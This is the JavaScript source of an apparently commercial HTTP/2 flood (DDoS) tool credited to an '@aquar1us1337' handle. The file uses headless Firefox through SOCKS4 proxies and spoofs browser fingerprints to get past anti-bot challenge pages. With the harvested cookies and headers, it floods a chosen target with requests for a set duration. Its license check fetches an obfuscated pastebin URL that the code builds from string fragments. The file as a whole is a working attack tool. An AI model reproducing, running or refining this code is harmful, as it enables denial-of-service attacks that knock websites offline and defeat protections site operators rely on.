/*																																						
										Made by @aquar1us1337 || discord: aqu#1337 tg: aqu1337
*/

const fs = require("fs");
const { firefox } = require("playwright-extra");
const { FingerprintGenerator } = require("./fingerprint-generator/index.js");
const { FingerprintInjector } = require("./fingerprint-injector/index.js");
const { UAParser } = require("ua-parser-js");
const { Cookie, CookieJar } = require("tough-cookie");
const url = require("url");
const gradient = require("gradient-string");
const http = require("http");
const crypto = require("crypto");
var requests = require("request");

const events = require("events");
events.defaultMaxListeners = 0;

const tls = require("tls");
const dns = require("dns");
const { SocksClient } = require("socks");
const { PassThrough } = require("stream");
const JSStreamSocket = new tls.TLSSocket(new PassThrough())._handle._parentWrap
  .constructor;
const http2 = require("http2");

const EventEmitter = require("events");
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);

process.setMaxListeners(0);

const sdasd = "https://";
const qaiwdhjuwdj = "p";
const uqwdf = "aste";
const msidstressgay = "bin";
const meowgay = ".";
const meowmsidstressgay = "c";
const kkkkkkkkas = "om";
const rawseajd = "/ra";
const aosdokawod = "w/";
const oooooaasdas = "b5UuNZRL";
let ddd = "150";
let fff = "0";
let thas = "0";
let status_200 = "0";
let status_403 = "0";
let status_502 = "0";
let status_503 = "0";
var jshead = "";
var jsftech = "";
const g_useragent = "";

function sleep(ms) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
}

protone = {
  url:
    sdasd +
    qaiwdhjuwdj +
    uqwdf +
    msidstressgay +
    meowgay +
    meowmsidstressgay +
    kkkkkkkkas +
    rawseajd +
    aosdokawod +
    oooooaasdas,
};

function getArgs() {
  const _0 = {};
  process.argv.slice(2, process.argv.length).forEach((_1) => {
    if (_1.slice(0, 2) === "--") {
      const _3 = _1.split("=");
      const _4 = _3[0].slice(2, _3[0].length);
      const _5 = _3.length > 1 ? _3[1] : true;
      _0[_4] = _5;
    } else {
      if (_1[0] === "-") {
        const _2 = _1.slice(1, _1.length).split("");
        _2.forEach((_1) => {
          _0[_1] = true;
        });
      }
    }
  });
  return _0;
}
const args = getArgs();

if (args["debug"] == "true") {
  process.on("uncaughtException", function (error) {
    console.log(error);
  });

  process.on("unhandledRejection", function (error) {
    console.log(error);
  });
} else {
  process.on("uncaughtException", function (error) {});

  process.on("unhandledRejection", function (error) {});
}

if (
  (args["key"] != undefined) &
  (args["target"] != undefined) &
  (args["time"] != undefined) &
  (args["threads"] != undefined) &
  (args["requests"] != undefined) &
  (args["mode"] != undefined) &
  (args["proxy"] != undefined)
) {
  requests["get"](protone, function (one, two, three) {
    if (args["key"] == three) {
      getdata();
    } else {
      console.log("Made by *@aqu1337* | by @aqu1337");
    }
  });
} else {
  console.log("Made by *@aqu1337* | by @aqu1337");

  process.exit(-1);
}

function getdata() {
  var mode = args["mode"];

  var target = args["target"];

  var time = args["time"];

  var threads = args["threads"];

  var requests = args["requests"];

  var proxyfile = args["proxy"];

  var parsed = url.parse(args["target"]);

  if ((mode != "GET") & (mode != "POST") & (mode != "PRI")) {
    console.clear();
    console.log("Error!");
    console.log("Mode only: [GET | POST | PRI] | @aqu1337");
    process.exit(-1);
  }
  if (args["auto"] == "true") {
    var auto = args["auto"];
  } else {
    var auto = "false";
  }

  if (args["bfm"] != undefined) {
    var bfm = args["bfm"];
  } else {
    var bfm = "false";
  }

  console.clear();
  console.log("--> Browser Launch #" + threads);

  function osnova() {
    const proxies = fs
      .readFileSync(proxyfile, "utf-8")
      .toString()
      .replace(/\r/g, "")
      .split("\n")
      .filter((word) => word.trim().length > 0);
    var session = [];
    var sessions = [];

    function randomProxies() {
      const whois = proxies[Math.floor(Math.random() * proxies.length)];
      proxies.remove(whois);
      return whois;
    }
    Array.prototype.remove = function () {
      var what,
        a = arguments,
        L = a.length,
        ax;
      while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
          this.splice(ax, 1);
        }
      }
      return this;
    };

    async function addsessions() {
      try {
        const randed = randomProxies();
        var parsed = url.parse(target);
        solvings({
          url: target,
          proxy: randed,
          reqperip: requests,
          mode: mode,
          bfm: bfm,
        })
          .then((cookie, ua) => {
            let myString = "";
            let laa_ = JSON.stringify(cookie);
            laa_ = JSON.parse(laa_);
            laa_.forEach((value) => {
              const valueString = value.name + "=" + value.value + ";";
              myString += valueString;
            });
            sessions.push({
              myString: myString,
              reqperip: requests,
              randed: randed,
              mode: mode,
            });
            console.log(gradient("orange", "white")("--> Cookie: " + myString));
            console.log(
              gradient("orange", "white")("--> UA: " + jshead["user-agent"])
            );
            browser_flood(
              target,
              time,
              parsed,
              myString,
              randed,
              requests,
              mode
            );
          })
          .catch((ee) => {
            try {
              addsessions();
            } catch (e) {}
          });
      } catch (e) {}
    }

    if (fff < ddd) {
      if (args["auto"] == "true") {
        setInterval(() => {
          for (let jasdfj = 0; jasdfj < 3; jasdfj++) {
            addsessions();
            fff++;
          }
        }, 5000);
      }
    } else {
      console.log("--> Auto-Solving [END]");
    }

    for (let i = 0; i < threads; i++) {
      addsessions();
    }
  }
  osnova();
}

function solvings(message) {
  return new Promise((resolve, reject) => {
    const fingerprintGenerator = new FingerprintGenerator();
    const browserFingerprintWithHeaders = fingerprintGenerator.getFingerprint({
      devices: ["desktop"],
      browsers: [{ name: "firefox", minVersion: 104 }],
      operatingSystems: ["windows"],
    });
    const fingerprintInjector = new FingerprintInjector();
    const { fingerprint } = browserFingerprintWithHeaders;
    const useragns = fingerprint.navigator.userAgent;
    const locale = fingerprint.navigator.language;

    console.log("--> Browser: [Launch]");

    async function man() {
      console.log("--> Proxy: [" + message.proxy + "]");
      firefox
        .launch({
          proxy: {
            server: "socks4://" + message.proxy,
          },
          args: [
            "--disable-blink-features=AutomationControlled",
            "--disable-features=IsolateOrigins,site-per-process",
            "--renderer-process-limit=1",
            "--mute-audio",
            "--disable-setuid-sandbox",
            "--enable-webgl",
            "--ignore-certificate-errors",
            "--use-gl=disabled",
            "--color-scheme=dark",
            "--user-agent=" + useragns,
          ],
          ignoreDefaultArgs: ["--enable-automation"],
          headless: true,
          javaScriptEnabled: true,
          ignoreHTTPSErrors: true,
        })
        .then(async (browser) => {
          const context = await browser.newContext({
            userAgent: useragns,
            locale: fingerprint.navigator.language,
            viewport: fingerprint.screen,
          });
          await fingerprintInjector.attachFingerprintToPlaywright(
            context,
            browserFingerprintWithHeaders
          );

          const parser = new UAParser();
          parser.setUA(useragns);
          const result = parser.getResult();

          await context.addInitScript(
            (args) => {
              (function () {
                const ua = args.ua;
                const os = args.os;

                const userAgentData = Object.create(NavigatorUAData.prototype);
                const brands = [
                  { brand: "Not A;Brand", version: "8" },
                  { brand: "Chromium", version: "108" },
                  { brand: "Google Chrome", version: "108" },
                ];
                Object.defineProperty(userAgentData, "brands", {
                  get: function () {
                    return brands;
                  },
                });
                Object.defineProperty(userAgentData, "mobile", {
                  get: function () {
                    return false;
                  },
                });
                Object.defineProperty(userAgentData, "platform", {
                  get: function () {
                    return os.name;
                  },
                });

                NavigatorUAData.prototype.getHighEntropyValues = function (
                  hints
                ) {
                  if (hints.length == 0) return {};

                  let hint = {
                    brands,
                    mobile: false,
                    platform: os.name,
                  };

                  const getters = {
                    architecture: function () {
                      return { architecture: "x86" };
                    },
                    bitness: function () {
                      return { bitness: "64" };
                    },
                    model: function () {
                      return "";
                    },
                    platformVersion: function () {
                      return { platform: os.name, platformVersion: os.version };
                    },
                    uaFullVersion: function () {
                      return { uaFullVersion: ua.version };
                    },
                    fullVersionList: function () {
                      return { fullVersionList: this.brands };
                    },
                  };

                  for (let h in hints) {
                    if (getters[hints[h]] != null)
                      Object.assign(hint, getters[hints[h]]());
                  }
                  return hint;
                };
                Object.defineProperty(window.navigator, "userAgentData", {
                  get: function () {
                    return userAgentData;
                  },
                });
              })();
            },
            {
              ua: result.browser,
              os: result.os,
            }
          );

          /*																																						
										Made by @aquar1us1337 || discord: aqu#1337 tg: aqu1337
*/

          await context.addInitScript(() => {
            Object.defineProperty(navigator, "pdfViewerEnabled", {
              get: () => true,
            });
          });

          await context.addInitScript(() => {
            ["height", "width"].forEach((property) => {
              const imageDescriptor = Object.getOwnPropertyDescriptor(
                HTMLImageElement.prototype,
                property
              );
              Object.defineProperty(HTMLImageElement.prototype, property, {
                ...imageDescriptor,
                get: function () {
                  if (this.complete && this.naturalHeight == 0) {
                    return 20;
                  }
                  return imageDescriptor.get.apply(this);
                },
              });
            });
          });

          await context.addInitScript(() => {
            Object.defineProperty(window.Notification, "permission", {
              get: () => "granted",
            });
          });

          try {
            const page = await context.newPage({
              userAgent: useragns,
              locale: fingerprint.navigator.language,
              viewport: fingerprint.screen,
              deviceScaleFactor: 1,
            });
            await page.setDefaultNavigationTimeout(0);

            await context.on("page", (page) => {
              page.emulateMedia({ colorScheme: "dark" }).catch(() => {});
            });
            await page.setViewportSize({
              width: fingerprint.screen.width,
              height: fingerprint.screen.height,
            });
            await page.route("***", (route) => route.continue());

            await page.on("response", (resp) => {
              jshead = resp.request().headers();
            });

            await page.goto(message.url);
            await page.waitForTimeout(20000);
            const gettitle = await page.title();
            if (
              gettitle == "Checking your browser..." ||
              gettitle == "Just a moment..."
            ) {
              await browser.close();
            }

            const title = await page.title();
            const cookies = await page.context().cookies();
            if (cookies) {
              console.log("--> Title: " + title);
              resolve(cookies);
              await browser.close();
              return;
            }
          } catch (error) {
            reject(error);
            await browser.close();
          }
        });
    }
    man();
  });
}

async function browser_flood(
  target,
  time,
  parsed,
  myString,
  randed,
  requests,
  mode
) {
  function flood() {
    const headersall = jshead;

    const url = new URL(target);
    var parts = randed;
    parts = parts.split(":");
    let payload = {};
    let ip = null;

    if (target.indexOf(".onion") != -1) {
      ip = url.hostname;
    } else {
      setInterval(() => {
        dns.lookup(url.hostname, 4, (err, address, family) => {
          ip = address;
        });
      }, 1000);
    }
    setInterval(() => {
      const options = {
        proxy: {
          host: parts[0],
          port: Number(parts[1]),
          type: 4,
        },

        command: "connect",

        destination: {
          host: ip,
          port:
            url.port == ""
              ? url.protocol == "https:"
                ? 443
                : 80
              : Number(url.port),
        },
      };
      SocksClient.createConnection(options, (err, info) => {
        function sendRequest(socket) {
          http2
            .connect(
              `http://${url.host}${url.pathname}`,
              {
                createConnection: () => socket,
                settings: {
                  headerTableSize: 65536,
                  maxConcurrentStreams: 25000,
                  initialWindowSize: 1073741823,
                  maxSessionMemory: 128000,
                  maxDeflateDynamicTableSize: 4294967295,
                  maxHeaderListSize: 262144,
                  enablePush: false,
                },
              },
              (session) => {
                setInterval(async () => {
                  for (let i = 0; i < requests; i++) {
                    const requestHeaders = Object.assign(
                      {
                        GET: " / HTTP/2",
                        host: parsed.host,
                      },
                      {
                        "user-agent": headersall["user-agent"],
                        accept: headersall["accept"],
                        "accept-language": headersall["accept-language"],
                        "accept-encoding": headersall["accept-encoding"],
                        "cache-control":
                          "no-cache, no-store,private, max-age=0, must-revalidate",
                        "upgrade-insecure-requests": "1",
                        "sec-fetch-dest": headersall["sec-fetch-dest"],
                        "sec-fetch-mode": headersall["sec-fetch-mode"],
                        "sec-fetch-site": headersall["sec-fetch-site"],
                        TE: headersall["trailers"],
                        "x-requested-with": "XMLHttpRequest",
                        cookie: headersall["cookie"],
                        pragma: "no-cache",
                        "cache-control": "no-cache",
                      }
                    );
                    await session.request(requestHeaders).close();
                  }
                }, 1000);
              }
            )
            .on("error", () => {});
        }

        const socket = tls.connect(
          {
            rejectUnauthorized: false,
            servername: url.hostname,
            honorCipherOrder: false,
            requestCert: true,
            socket: new JSStreamSocket(info.socket),
            secure: true,
            ALPNProtocols: ["h2"],
          },
          () => {
            sendRequest(socket);
          }
        );
      });
    }, 1000);
  }

  setInterval(flood);
  setTimeout(function () {
    console.clear();
    process.exit();
  }, time * 1000);
}

/*																																						
										Made by @aquar1us1337 || discord: aqu#1337 tg: aqu1337
*/
